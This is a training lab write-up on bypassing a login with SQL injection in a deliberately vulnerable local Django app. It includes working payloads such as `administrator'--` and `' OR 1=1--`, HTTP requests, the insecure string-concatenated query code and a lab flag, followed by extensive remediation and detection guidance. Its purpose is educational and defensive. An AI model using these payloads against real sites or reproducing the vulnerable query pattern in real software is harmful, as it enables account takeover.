# Lab 02 — SQL injection vulnerability allowing login bypass

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/lab-login-bypass> |
| Lab id | `psw-sqli-02-login-bypass` |
| Vulnerability class | SQL Injection — authentication bypass via comment injection |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18002/> |
| Flag | `FLAG{psw-sqli-02-admin-bypass-via-quote-comment}` |

### Objective

A classic sign-in form authenticates users by looking up a matching `(username, password)` row in the `users` table. The `administrator` account is seeded with a cryptographically random password (`secrets.token_urlsafe(32)`) that cannot be brute-forced. The attacker's goal is to land an authenticated session as `administrator` without ever producing the correct password — by rewriting the lookup query so the password check is commented out. The flag is carried on the administrator's `email` column and is rendered on `/my-account` once the server believes the session belongs to that user.

---

## 2. Exploit walkthrough

The login view concatenates `username` and `password` into a single SQL string wrapped in single quotes. Breaking out of the `username` quote and commenting out the rest of the statement removes the `AND password = '...'` clause entirely, so the lookup resolves on username alone.

**Step 1 — baseline request (benign, fails)**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18002
Content-Type: application/x-www-form-urlencoded

username=administrator&password=guess
```

The server executes:

```sql
SELECT id, username, is_admin
FROM users
WHERE username = 'administrator' AND password = 'guess'
```

No row matches, the view re-renders `login.html` with "Invalid username or password." and echoes the composed SQL back in the `executed_sql` panel.

**Step 2 — inject to bypass the password predicate**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18002
Content-Type: application/x-www-form-urlencoded

username=administrator'--+&password=anything
```

URL-decoded username: `administrator'-- ` (the trailing space after `--` is mandatory for SQLite's line-comment token).

Executed SQL becomes:

```sql
SELECT id, username, is_admin
FROM users
WHERE username = 'administrator'-- ' AND password = 'anything'
```

The `-- ` turns the remainder of the line into a comment. The driver only sees `WHERE username = 'administrator'`, the single row is returned, `request.session["user_id"]` is set to the administrator's id, and the view 302s to `/my-account`.

**Step 3 — harvest the flag**

```http
GET /my-account HTTP/1.1
Host: 127.0.0.1:18002
Cookie: sessionid=<returned above>
```

The template branches on `solved` and prints the flag embedded in the administrator's `email` column: `FLAG{psw-sqli-02-admin-bypass-via-quote-comment}`.

**Alternative payloads**

- `username=' OR is_admin=1--+` — finds the first admin without needing to know the username.
- `username=' OR 1=1--+` — returns the first row in the table; whether that authenticates the attacker as `administrator` depends on insertion order, so it is less reliable than pinning the username.

Because `views.py` also renders `executed_sql` on failure, the learner can iterate payloads in the browser and watch the concatenated query change shape in real time.

---

## 3. Vulnerable code

### Endpoint: `POST /login`

[accounts/views.py:57-64](accounts/views.py#L57-L64)

```python
    username = request.POST.get("username", "")
    password = request.POST.get("password", "")

    query = (
        "SELECT id, username, is_admin "
        "FROM users "
        "WHERE username = '" + username + "' AND password = '" + password + "'"
    )
```

Four issues stack here:

1. Both `username` and `password` are read directly from `request.POST` with no validation, no length limit, and no character filtering.
2. The two values are `+`-concatenated into a raw SQL string — the driver has no way to tell code from data.
3. The literal single quotes around each placeholder make it trivial for the attacker to break out using an embedded `'`.
4. A single line comment (`--`) closes the rest of the statement, erasing the password predicate without having to balance quotes.

[accounts/views.py:70-76](accounts/views.py#L70-L76)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            row = cursor.fetchone()
    except Exception as exc:
        row = None
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single argument, so the entire composed string is sent to SQLite as one statement. The `except` branch then pipes the raw driver exception into a rendered template — useful for the lab, but in production this would leak schema details to anyone poking the endpoint.

[accounts/views.py:78-90](accounts/views.py#L78-L90)

```python
    if row is not None:
        matched_user_id, matched_username, _is_admin = row
        request.session["user_id"] = matched_user_id
        return redirect("my_account")

    return render(
        request,
        "accounts/login.html",
        {
            "executed_sql": query,
            "error": error or "Invalid username or password.",
        },
    )
```

The trust boundary collapses the moment `row is not None`: the session is created from whatever id the injected query returned, and `executed_sql` is handed back to the client on failure so the attacker can see exactly what the driver parsed.

### Supporting model

[accounts/models.py:4-20](accounts/models.py#L4-L20) — `User` stores plaintext passwords (intentional for the lab) and lives in the `users` table referenced by the raw SQL.

### Seeded data

[accounts/management/commands/seed.py:32-37](accounts/management/commands/seed.py#L32-L37) — the administrator row is created with `secrets.token_urlsafe(32)` as its password, which rules out guessing. The flag is stored in the `email` column, retrievable only once the server mistakes the attacker for that user.

### Session resolution

[accounts/views.py:40-44](accounts/views.py#L40-L44) — `_current_user` looks up the user purely by `session["user_id"]`, so hijacking the session cookie is sufficient; no re-check against the supplied password occurs after the initial injected query.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** | SQLite cannot distinguish the attacker's `'` / `--` tokens from literal data, so the query shape is rewritten at parse time. |
| **Raw SQL used for a trivially ORM-able lookup** | `User.objects.filter(username=..., password=...)` would have been safe by construction; the hand-rolled query bypasses Django's bound-parameter machinery. |
| **Authentication treated as "does a row come back?"** | A single predicate (password) guards the entire trust boundary. Strip that predicate and authentication collapses. |
| **Passwords stored in plaintext** | Even if the password predicate were kept, a `UNION SELECT` extension of this same bug would leak credentials wholesale; the schema offers no secondary defence. |
| **Exception text and composed query reflected to the client** | `Database error: …` and `executed_sql` leak internals that accelerate payload development and, in the wild, fingerprint the database engine. |
| **`DEBUG = True` in `sqli_lab/settings.py:15`** | Django's debug page would leak even more on unhandled errors. |

---

## 5. Code-level mitigation

### 5.1 Parameterised query

The minimum safe rewrite is to let the driver bind `username` and `password` as values, not fragments of SQL:

```python
# accounts/views.py — fixed
query = (
    "SELECT id, username, is_admin "
    "FROM users "
    "WHERE username = %s AND password = %s"
)
with connection.cursor() as cursor:
    cursor.execute(query, [username, password])   # bound parameters
    row = cursor.fetchone()
```

With bound parameters, `administrator'-- ` is compared literally against the `username` column. No such row exists, `fetchone()` returns `None`, and the login fails as intended.

### 5.2 Prefer Django auth / ORM over raw SQL

The cleanest remediation is to stop writing the lookup by hand. For this lab's `User` model:

```python
from django.contrib.auth.hashers import check_password
from .models import User

user = User.objects.filter(username=username).first()
if user is None or not check_password(password, user.password):
    return render(request, "accounts/login.html",
                  {"error": "Invalid username or password."})
request.session["user_id"] = user.pk
return redirect("my_account")
```

For production apps, migrate to `django.contrib.auth` entirely (`AbstractUser`, `authenticate()`, `login()`) so session handling, password hashing, and rate-limiting are no longer ad-hoc.

### 5.3 Hash passwords at rest

`secrets.token_urlsafe(32)` for the administrator row is a lab shortcut; the real fix is a password hasher:

```python
# accounts/management/commands/seed.py — fixed seed
from django.contrib.auth.hashers import make_password

User.objects.create(
    username="administrator",
    password=make_password(secrets.token_urlsafe(32)),
    email="...",
    is_admin=True,
)
```

Paired with `check_password` on the login path, a successful injection that returns a row still cannot authenticate unless the attacker also supplies a matching plaintext password.

### 5.4 Input validation

Usernames are drawn from a narrow character set. Reject obvious tampering before the query runs:

```python
import re

USERNAME_RE = re.compile(r"^[A-Za-z0-9_.-]{1,64}$")

if not USERNAME_RE.match(username):
    return render(request, "accounts/login.html",
                  {"error": "Invalid credentials."})
```

Parameterisation stops injection; validation cuts down the attack surface and blocks tooling that fuzzes exotic payloads.

### 5.5 Constant-time, generic failure messages

Remove both `executed_sql` and the raw `Database error: {exc}` leak from the response:

```python
except Exception:
    row = None
    error = "Invalid username or password."
...
return render(request, "accounts/login.html", {"error": error})
```

Do not expose composed SQL or driver exceptions to unauthenticated clients. Keep the message identical whether the username exists, the password is wrong, or the driver threw — this also closes user-enumeration side channels.

### 5.6 Harden the template

Delete the `executed_sql` block in [accounts/templates/accounts/login.html:23-28](accounts/templates/accounts/login.html#L23-L28) so even a misconfigured view cannot reflect the query to the client.

### 5.7 Rate limiting and lockout

Even with a safe query, unlimited login attempts enable credential-stuffing. Add `django-axes` or a custom middleware that locks an account after N failures per window, and applies a per-IP rate limit on `/login`.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Put OWASP Core Rule Set in front of the app. Relevant rules for this specific endpoint:

- `REQUEST-942` — SQL injection detection (`'--`, `OR 1=1`, `UNION SELECT`, tautologies in form fields).
- `REQUEST-920` — protocol enforcement (reject oversized / non-UTF-8 POST bodies targeting `/login`).
- `REQUEST-921` — HTTP protocol attacks.

A WAF is a secondary layer; it should never be the only control between a concatenated SQL builder and the database.

### 6.2 Least-privilege database account

The Django process should connect as a role that can only do what the app needs. For a Postgres/MySQL production deployment of this app, that means:

- `SELECT`, `INSERT`, `UPDATE` on `users` and the session table — nothing else.
- No `DDL` (`CREATE`, `ALTER`, `DROP`).
- No access to catalog schemas (`pg_catalog`, `information_schema`) beyond what the ORM strictly needs.
- No `FILE` privileges (`COPY`, `LOAD DATA INFILE`, `INTO OUTFILE`).

The lab ships SQLite inside a single container ([sqli_lab/settings.py:49-54](sqli_lab/settings.py#L49-L54)), so privilege separation is handled by the OS and the container sandbox — the equivalent hardening is to run the container as non-root and mount the DB file read-only wherever possible.

### 6.3 Network segmentation & egress control

- The app binds only to `127.0.0.1:18002` via `docker-compose.yml:9-10`, which keeps the lab off the network. Preserve that loopback binding in any shared lab environment.
- In production, the DB tier listens only on the private VPC / Docker network, never on a public interface.
- Block outbound traffic from the DB host so that a future injection pivot (`COPY PROGRAM`, `xp_cmdshell`, UDF loading) cannot reach the internet.

### 6.4 Session & transport hardening

- Serve `/login` over HTTPS only and set `SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_HTTPONLY = True`, `SESSION_COOKIE_SAMESITE = "Lax"`.
- Re-enable CSRF on the login form — `@csrf_exempt` in [accounts/views.py:51](accounts/views.py#L51) exists to simplify the lab, but a real app needs the Django CSRF token.
- Rotate the session id on successful authentication (`request.session.cycle_key()`).

### 6.5 Monitoring & alerting

- Log every login attempt with outcome and source IP. A burst of failures followed by a sudden success is a strong injection signal.
- Alert on SQL parse errors emitted by SQLite (`near "'": syntax error`) — legitimate users never generate those.
- Alert on login attempts whose `username` or `password` field contains `'`, `--`, `/*`, or `UNION` (case-insensitive) — these are almost always attacks against this endpoint shape.

### 6.6 Secrets and debug posture

- Set `DEBUG = False` for any deployment that is not strictly local training.
- Replace the hard-coded `SECRET_KEY` in [sqli_lab/settings.py:13](sqli_lab/settings.py#L13) with a per-environment secret drawn from the container's environment or a secrets manager.
- Tighten `ALLOWED_HOSTS` off `"*"` to a specific hostname.

---

## 7. Defense-in-depth checklist

- [ ] No `+` / f-string / `%` SQL builders anywhere in the codebase — enforced by lint (`bandit B608`, `semgrep`).
- [ ] All authentication flows use `django.contrib.auth.authenticate` (or equivalent bound-parameter ORM lookup).
- [ ] Passwords stored with `make_password` / `check_password`, never plaintext.
- [ ] Generic "invalid credentials" response — no username enumeration, no driver exception leak, no echoed SQL.
- [ ] CSRF enabled on the login form; `@csrf_exempt` removed.
- [ ] Rate limit and account lockout on `/login`.
- [ ] Session id rotates on login; session cookies `Secure`, `HttpOnly`, `SameSite=Lax`.
- [ ] Least-privilege DB role with no DDL, no file I/O, no catalog browsing.
- [ ] `DEBUG = False`, unique `SECRET_KEY`, pinned `ALLOWED_HOSTS` in production settings.
- [ ] WAF with OWASP CRS in front of the login endpoint.
- [ ] SAST in CI flags `cursor.execute(f"...")`, `cursor.execute("..." + x)`, and concatenation in any DB-adjacent module.
- [ ] Structured authentication logs with alerting on failure spikes and SQL parse errors.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- CWE-564 — [SQL Injection: Hibernate / hand-rolled queries](https://cwe.mitre.org/data/definitions/564.html)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- Django docs — [Password management](https://docs.djangoproject.com/en/5.0/topics/auth/passwords/)
- OWASP CRS — <https://coreruleset.org/>
